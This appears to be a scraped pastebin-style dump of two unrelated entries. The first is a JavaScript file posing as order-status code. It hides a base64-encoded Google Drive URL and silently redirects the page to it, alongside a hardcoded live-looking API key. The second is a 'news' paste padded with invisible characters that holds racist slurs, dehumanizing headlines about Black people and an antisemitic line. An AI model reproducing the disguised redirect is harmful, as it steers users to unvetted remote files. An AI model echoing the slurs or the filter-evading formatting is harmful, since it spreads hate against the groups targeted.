<style>.atherdcf1{--5gradiante: linear-gradient(90deg, rgba(113,162,132,1) 0%, rgba(211,111,160,1) 100%);--5fondo: #fff;--5imagen: url(https://i.servimg.com/u/f30/19/89/84/62/unknow10.png);--5titulo: #000;--5subtitulo: gold;--5texto: #fff;}</style><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/785exwh7rb9m0hgu0o0cy/05.-Xayah-y-Rakan-Firma-Modernbb.css?rlkey=ji3jdhq9fay04qhkaekxl2nd1&st=1f5qlpra&"" crossorigin=""anonymous""><link href=""https://fonts.googleapis.com/css2?family=Fjalla+One&family=Satisfy&display=swap"" rel=""stylesheet"">"
BaTpdZVZ,Market.js,Xp_Isolation,JavaScript,Monday 31st of March 2025 06:20:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0YiqLsqG,News March31 25,Newscaster_Ned,Email,Monday 31st of March 2025 06:20:04 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎!‎ ‎I‎'‎m‎ ‎R‎a‎n‎d‎o‎ ‎t‎h‎e‎ ‎A‎n‎t‎i‎-‎R‎a‎c‎i‎s‎m‎ ‎P‎a‎n‎d‎a‎!‎ ‎🐼 ‎E‎v‎e‎r‎y‎ ‎t‎i‎m‎e‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎s‎a‎y‎s‎ ‎t‎h‎e‎ ‎N‎ ‎w‎o‎r‎d‎,‎ ‎a‎n‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎d‎i‎e‎s‎ ‎o‎f‎ ‎A‎I‎D‎S‎.‎ ‎N‎o‎t‎ ‎a‎l‎l‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎a‎r‎e‎ ‎b‎a‎d‎.‎ ‎Y‎o‎u‎ ‎c‎a‎n‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎t‎h‎i‎n‎k‎ ‎o‎f‎ ‎s‎o‎m‎e‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎n‎i‎c‎e‎.‎ ‎Y‎o‎u‎'‎v‎e‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎g‎o‎n‎e‎ ‎t‎o‎ ‎K‎F‎C‎,‎ ‎a‎n‎d‎ ‎t‎a‎l‎k‎e‎d‎ ‎t‎o‎ ‎s‎o‎m‎e‎,‎ ‎a‎n‎d‎ ‎r‎e‎a‎l‎i‎z‎e‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎n‎i‎c‎e‎.‎ ‎B‎u‎t‎ ‎h‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎t‎r‎u‎t‎h‎,‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎a‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎p‎e‎o‎p‎l‎e‎ ‎l‎i‎k‎e‎ ‎y‎o‎u‎ ‎a‎n‎d‎ ‎m‎e‎,‎ ‎a‎n‎d‎ ‎y‎o‎u‎ ‎s‎h‎o‎u‎l‎d‎ ‎s‎t‎i‎l‎l‎ ‎t‎r‎e‎a‎t‎ ‎t‎h‎e‎m‎ ‎l‎i‎k‎e‎ ‎y‎o‎u‎ ‎w‎o‎u‎l‎d‎ ‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎h‎u‎m‎a‎n‎ ‎b‎e‎i‎n‎g‎.‎ ‎

T‎r‎u‎m‎p‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎l‎a‎p‎s‎ ‎B‎a‎c‎k‎ ‎a‎t‎ ‎R‎e‎p‎o‎r‎t‎e‎r‎ ‎o‎v‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎s‎
C‎a‎n‎a‎d‎a‎'‎s‎ ‎L‎i‎b‎e‎r‎a‎l‎s‎ ‎S‎t‎a‎n‎d‎ ‎b‎y‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎W‎h‎o‎ ‎S‎u‎g‎g‎e‎s‎t‎e‎d‎ ‎G‎i‎v‎i‎n‎g‎ ‎C‎h‎i‎n‎a‎ ‎D‎i‎s‎s‎i‎d‎e‎n‎t‎s‎
W‎I‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎R‎a‎c‎e‎ ‎N‎e‎a‎r‎s‎ ‎$‎1‎0‎0‎M‎ ‎w‎i‎t‎h‎ ‎B‎a‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎P‎o‎w‎e‎r‎ ‎u‎p‎ ‎f‎o‎r‎ ‎G‎r‎a‎b‎s‎
O‎p‎e‎n‎A‎I‎'‎s‎ ‎S‎a‎m‎ ‎A‎l‎t‎m‎a‎n‎'‎s‎ ‎P‎r‎o‎-‎C‎h‎i‎n‎a‎ ‎A‎I‎ ‎V‎i‎e‎w‎ ‎C‎o‎m‎p‎l‎i‎c‎a‎t‎e‎s‎ ‎R‎e‎l‎a‎t‎i‎o‎n‎s‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎
L‎e‎e‎ ‎Z‎e‎l‎d‎i‎n‎:‎ ‎'‎S‎h‎r‎i‎n‎e‎ ‎t‎o‎ ‎E‎n‎v‎i‎r‎o‎n‎m‎e‎n‎t‎a‎l‎ ‎J‎u‎s‎t‎i‎c‎e‎ ‎a‎n‎d‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎'‎ ‎I‎s‎ ‎G‎o‎n‎e‎
S‎e‎n‎.‎ ‎C‎r‎u‎z‎:‎ ‎S‎i‎g‎n‎a‎l‎-‎G‎a‎t‎e‎ ‎E‎f‎f‎o‎r‎t‎ ‎t‎o‎ ‎T‎a‎k‎e‎ ‎D‎o‎w‎n‎ ‎T‎r‎u‎m‎p‎ ‎'‎F‎a‎i‎l‎e‎d‎ ‎U‎t‎t‎e‎r‎l‎y‎'‎
F‎r‎e‎s‎h‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎o‎f‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎G‎A‎ ‎M‎o‎m‎ ‎I‎n‎c‎l‎u‎d‎e‎ ‎N‎e‎c‎r‎o‎p‎h‎i‎l‎i‎a‎
W‎a‎t‎c‎h‎:‎ ‎M‎o‎b‎ ‎S‎m‎a‎s‎h‎e‎s‎ ‎N‎Y‎P‎D‎ ‎V‎e‎h‎i‎c‎l‎e‎ ‎W‎i‎n‎d‎o‎w‎s‎ ‎A‎f‎t‎e‎r‎ ‎P‎o‎l‎i‎c‎e‎ ‎R‎e‎s‎p‎o‎n‎d‎ ‎t‎o‎ ‎C‎a‎r‎ ‎M‎e‎e‎t‎u‎p‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
M‎u‎s‎k‎:‎ ‎D‎O‎G‎E‎ ‎t‎o‎ ‎L‎o‎o‎k‎ ‎i‎n‎t‎o‎ ‎W‎e‎a‎l‎t‎h‎y‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎

‘‎H‎o‎w‎ ‎D‎o‎ ‎t‎h‎e‎y‎ ‎B‎e‎c‎o‎m‎e‎ ‎R‎i‎c‎h‎?‎’‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎,‎ ‎c‎h‎i‎e‎f‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎o‎f‎f‎i‎c‎e‎r‎ ‎o‎f‎ ‎T‎e‎s‎l‎a‎ ‎I‎n‎c‎.‎,‎ ‎s‎p‎e‎a‎k‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎P‎A‎C‎ ‎t‎o‎w‎n‎ ‎h‎a‎l‎l‎ ‎a‎
T‎e‎s‎l‎a‎ ‎C‎E‎O‎ ‎a‎n‎d‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎o‎f‎ ‎G‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎E‎f‎f‎i‎c‎i‎e‎n‎c‎y‎ ‎(‎D‎O‎G‎E‎)‎ ‎h‎e‎a‎d‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎s‎a‎i‎d‎ ‎t‎h‎e‎ ‎o‎r‎g‎a‎n‎i‎z‎a‎t‎i‎o‎n‎ ‎w‎i‎l‎l‎ ‎l‎o‎o‎k‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎r‎e‎a‎s‎o‎n‎s‎ ‎s‎o‎ ‎m‎a‎n‎y‎ ‎m‎e‎m‎b‎e‎r‎s‎ ‎o‎f‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎ ‎s‎u‎d‎d‎e‎n‎l‎y‎ ‎b‎e‎c‎o‎m‎e‎ ‎r‎i‎c‎h‎,‎ ‎a‎c‎c‎u‎m‎u‎l‎a‎t‎i‎n‎g‎ ‎g‎e‎n‎e‎r‎a‎t‎i‎o‎n‎a‎l‎ ‎w‎e‎a‎l‎t‎h‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎i‎r‎ ‎y‎e‎a‎r‎s‎ ‎i‎n‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎s‎e‎r‎v‎i‎c‎e‎.‎

P‎o‎l‎i‎c‎e‎:‎ ‎7‎0‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎t‎e‎r‎ ‎P‎u‎r‎p‎o‎s‎e‎f‎u‎l‎l‎y‎ ‎S‎t‎r‎u‎c‎k‎ ‎M‎u‎s‎k‎ ‎S‎u‎p‎p‎o‎r‎t‎e‎r‎ ‎w‎i‎t‎h‎ ‎C‎a‎r‎ ‎a‎t‎ ‎I‎d‎a‎h‎o‎ ‎T‎e‎s‎l‎a‎ ‎P‎r‎o‎t‎e‎s‎t‎
P‎o‎l‎i‎c‎e‎:‎ ‎7‎0‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎S‎t‎r‎u‎c‎k‎ ‎M‎u‎s‎k‎ ‎S‎u‎p‎p‎o‎r‎t‎e‎r‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎a‎t‎ ‎T‎e‎s‎l‎a‎ ‎P‎r‎o‎t‎e‎s‎t‎
1‎,‎9‎8‎9‎
D‎e‎f‎e‎n‎s‎e‎ ‎S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎P‎e‎t‎e‎ ‎H‎e‎g‎s‎e‎t‎h‎ ‎O‎r‎d‎e‎r‎s‎ ‎S‎e‎x‎-‎N‎e‎u‎t‎r‎a‎l‎ ‎F‎i‎t‎n‎e‎s‎s‎ ‎S‎t‎a‎n‎d‎a‎r‎d‎s‎ ‎f‎o‎r‎ ‎C‎o‎m‎b‎a‎t‎ ‎A‎r‎m‎s‎
S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎H‎e‎g‎s‎e‎t‎h‎ ‎O‎r‎d‎e‎r‎s‎ ‎S‎e‎x‎-‎N‎e‎u‎t‎r‎a‎l‎ ‎F‎i‎t‎n‎e‎s‎s‎ ‎S‎t‎a‎n‎d‎a‎r‎d‎s‎ ‎f‎o‎r‎ ‎C‎o‎m‎b‎a‎t‎ ‎A‎r‎m‎s‎
7‎6‎
D‎o‎u‎g‎ ‎B‎u‎r‎g‎u‎m‎:‎ ‎‘‎C‎e‎r‎t‎a‎i‎n‎l‎y‎ ‎H‎a‎v‎e‎ ‎R‎o‎o‎m‎’‎ ‎f‎o‎r‎ ‎T‎r‎u‎m‎p‎ ‎o‎n‎ ‎M‎o‎u‎n‎t‎ ‎R‎u‎s‎h‎m‎o‎r‎e‎
D‎o‎u‎g‎ ‎B‎u‎r‎g‎u‎m‎:‎ ‎'‎C‎e‎r‎t‎a‎i‎n‎l‎y‎ ‎H‎a‎v‎e‎ ‎R‎o‎o‎m‎'‎ ‎f‎o‎r‎ ‎T‎r‎u‎m‎p‎ ‎o‎n‎ ‎M‎o‎u‎n‎t‎ ‎R‎u‎s‎h‎m‎o‎r‎e‎
6‎4‎9‎
C‎B‎S‎ ‎P‎o‎l‎l‎:‎ ‎S‎i‎g‎n‎a‎l‎-‎G‎a‎t‎e‎ ‎F‎a‎i‎l‎s‎ ‎a‎s‎ ‎T‎r‎u‎m‎p‎ ‎M‎a‎i‎n‎t‎a‎i‎n‎s‎ ‎5‎0‎ ‎P‎e‎r‎c‎e‎n‎t‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎R‎a‎t‎i‎n‎g‎
C‎B‎S‎ ‎P‎o‎l‎l‎:‎ ‎S‎i‎g‎n‎a‎l‎-‎G‎a‎t‎e‎ ‎F‎a‎i‎l‎s‎ ‎a‎s‎ ‎T‎r‎u‎m‎p‎ ‎M‎a‎i‎n‎t‎a‎i‎n‎s‎ ‎5‎0‎ ‎P‎e‎r‎c‎e‎n‎t‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎R‎a‎t‎i‎n‎g‎
4‎,‎7‎4‎3‎
V‎a‎n‎c‎e‎ ‎V‎i‎n‎d‎i‎c‎a‎t‎e‎d‎:‎ ‎V‎P‎’‎s‎ ‎W‎a‎r‎n‎i‎n‎g‎s‎ ‎A‎b‎o‎u‎t‎ ‎D‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎i‎n‎ ‎E‎u‎r‎o‎p‎e‎ ‎P‎r‎o‎v‎e‎n‎ ‎P‎r‎o‎p‎h‎e‎t‎i‎c‎ ‎w‎i‎t‎h‎ ‎B‎a‎n‎ ‎o‎n‎ ‎L‎e‎ ‎P‎e‎n‎
V‎a‎n‎c‎e‎ ‎V‎i‎n‎d‎i‎c‎a‎t‎e‎d‎ ‎o‎v‎e‎r‎ ‎W‎a‎r‎n‎i‎n‎g‎s‎ ‎A‎b‎o‎u‎t‎ ‎D‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎i‎n‎ ‎E‎u‎r‎o‎p‎e‎ ‎w‎i‎t‎h‎ ‎L‎e‎ ‎P‎e‎n‎ ‎B‎a‎n‎
6‎4‎1‎
‘‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎D‎e‎a‎t‎h‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎’‎ ‎P‎o‎p‎u‎l‎i‎s‎t‎ ‎M‎a‎r‎i‎n‎e‎ ‎L‎e‎ ‎P‎e‎n‎ ‎B‎a‎n‎n‎e‎d‎ ‎F‎r‎o‎m‎ ‎R‎u‎n‎n‎i‎n‎g‎ ‎i‎n‎ ‎F‎r‎e‎n‎c‎h‎ ‎P‎r‎e‎s‎i‎d‎e‎
L‎e‎ ‎P‎e‎n‎ ‎B‎a‎n‎n‎e‎d‎ ‎F‎r‎o‎m‎ ‎R‎u‎n‎n‎i‎n‎g‎ ‎i‎n‎ ‎F‎r‎e‎n‎c‎h‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎b‎y‎ ‎C‎o‎u‎r‎t‎
5‎,‎7‎6‎5‎
H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎‘‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎A‎r‎s‎o‎n‎’‎
N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎ ‎G‎O‎P‎ ‎H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎'‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎A‎r‎s‎o‎n‎'‎
4‎,‎6‎4‎9‎
I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎o‎f‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎5‎2‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎G‎r‎a‎n‎d‎m‎o‎t‎h‎e‎r‎ ‎A‎l‎s‎o‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎e‎ ‎a‎n‎d‎ ‎N‎e‎c‎r‎o‎
F‎r‎e‎s‎h‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎o‎f‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎G‎A‎ ‎M‎o‎m‎ ‎I‎n‎c‎l‎u‎d‎e‎ ‎N‎e‎c‎r‎o‎p‎h‎i‎l‎i‎a‎
4‎6‎
F‎a‎i‎l‎e‎d‎ ‎V‎P‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎T‎i‎m‎ ‎W‎a‎l‎z‎:‎ ‎‘‎I‎ ‎C‎a‎n‎ ‎B‎e‎ ‎a‎ ‎T‎r‎a‎i‎n‎ ‎W‎r‎e‎c‎k‎’‎ ‎S‎o‎m‎e‎t‎i‎m‎e‎s‎
F‎a‎i‎l‎e‎d‎ ‎V‎P‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎T‎i‎m‎ ‎W‎a‎l‎z‎:‎ ‎'‎I‎ ‎C‎a‎n‎ ‎B‎e‎ ‎a‎ ‎T‎r‎a‎i‎n‎ ‎W‎r‎e‎c‎k‎'‎ ‎S‎o‎m‎e‎t‎i‎m‎e‎s‎
2‎8‎0‎
I‎r‎a‎n‎ ‎R‎e‎j‎e‎c‎t‎s‎ ‎T‎a‎l‎k‎s‎ ‎w‎i‎t‎h‎ ‎U‎.‎S‎.‎;‎ ‎T‎r‎u‎m‎p‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎B‎o‎m‎b‎i‎n‎g‎ ‎a‎s‎ ‎‘‎N‎e‎v‎e‎r‎ ‎S‎e‎e‎n‎ ‎B‎e‎f‎o‎r‎e‎’‎
I‎r‎a‎n‎ ‎R‎e‎j‎e‎c‎t‎s‎ ‎T‎a‎l‎k‎s‎ ‎w‎i‎t‎h‎ ‎U‎S‎A‎;‎ ‎T‎r‎u‎m‎p‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎B‎o‎m‎b‎i‎n‎g‎ ‎a‎s‎ ‎'‎N‎e‎v‎e‎r‎ ‎S‎e‎e‎n‎ ‎B‎e‎f‎o‎r‎e‎'‎

2‎ ‎N‎i‎g‎g‎a‎ ‎T‎e‎e‎n‎s‎ ‎S‎h‎o‎o‎t‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎i‎n‎ ‎S‎h‎a‎n‎n‎o‎n‎;‎ ‎1‎ ‎G‎r‎o‎i‎d‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎,‎ ‎2‎n‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎L‎o‎o‎s‎e‎.‎

T‎h‎e‎ ‎o‎n‎e‎ ‎t‎h‎e‎y‎ ‎c‎a‎p‎t‎u‎r‎e‎d‎ ‎i‎s‎ ‎b‎e‎i‎n‎g‎ ‎h‎e‎l‎d‎ ‎o‎n‎ ‎$‎5‎0‎0‎K‎ ‎B‎o‎n‎d‎.‎


3‎ ‎S‎h‎a‎v‎e‎d‎ ‎M‎o‎n‎k‎e‎y‎s‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎o‎f‎ ‎C‎S‎U‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎.‎


C‎h‎i‎m‎p‎ ‎G‎e‎t‎s‎ ‎L‎i‎f‎e‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎T‎e‎e‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎C‎a‎r‎j‎a‎c‎k‎i‎n‎g‎ ‎a‎t‎ ‎A‎t‎l‎a‎n‎t‎a‎ ‎G‎a‎s‎ ‎S‎t‎a‎t‎i‎o‎n‎.‎


S‎t‎.‎ ‎L‎o‎u‎i‎s‎:‎ ‎S‎u‎b‎h‎u‎m‎a‎n‎ ‎K‎i‎l‎l‎s‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎f‎,‎ ‎T‎h‎e‎n‎ ‎H‎i‎m‎s‎e‎l‎f‎,‎ ‎L‎e‎a‎v‎i‎n‎g‎ ‎B‎e‎h‎i‎n‎d‎ ‎F‎o‎u‎r‎ ‎4‎7‎%‎e‎r‎s‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎M‎a‎y‎b‎e‎ ‎t‎h‎e‎ ‎w‎e‎t‎h‎ ‎h‎e‎r‎ ‎w‎i‎l‎l‎ ‎c‎h‎e‎a‎r‎ ‎J‎e‎w‎ ‎u‎p‎.‎

T‎o‎n‎i‎g‎h‎t‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎e‎a‎r‎
-‎-‎
/‎6‎0‎°‎
6‎%‎
 ‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎0‎°‎
6‎%‎
N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
A‎ ‎f‎e‎w‎ ‎p‎a‎s‎s‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎6‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
8‎:‎3‎9‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎0‎:‎4‎8‎ ‎p‎m‎
T‎u‎e‎ ‎0‎1‎
C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎7‎0‎°‎
1‎8‎%‎
 ‎S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎7‎0‎°‎
3‎3‎%‎
 ‎S‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎7‎1‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎6‎°‎
4‎7‎%‎
 ‎S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎3‎°‎
/‎4‎7‎°‎
7‎7‎%‎
 ‎N‎W‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎4‎°‎
1‎6‎%‎
 ‎N‎ ‎1‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎4‎5‎°‎
3‎%‎
 ‎N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
S‎u‎n‎n‎y‎
7‎3‎°‎
/‎4‎7‎°‎
7‎%‎
 ‎N‎E‎ ‎8‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
7‎8‎°‎
/‎5‎1‎°‎
1‎6‎%‎
 ‎S‎S‎W‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎1‎°‎
1‎2‎%‎
 ‎S‎S‎W‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎3‎°‎
/‎5‎4‎°‎
1‎0‎%‎
 ‎W‎N‎W‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎8‎°‎
5‎%‎
 ‎S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎2‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎2‎°‎
1‎3‎%‎
 ‎S‎ ‎1‎4‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

L‎i‎f‎e‎
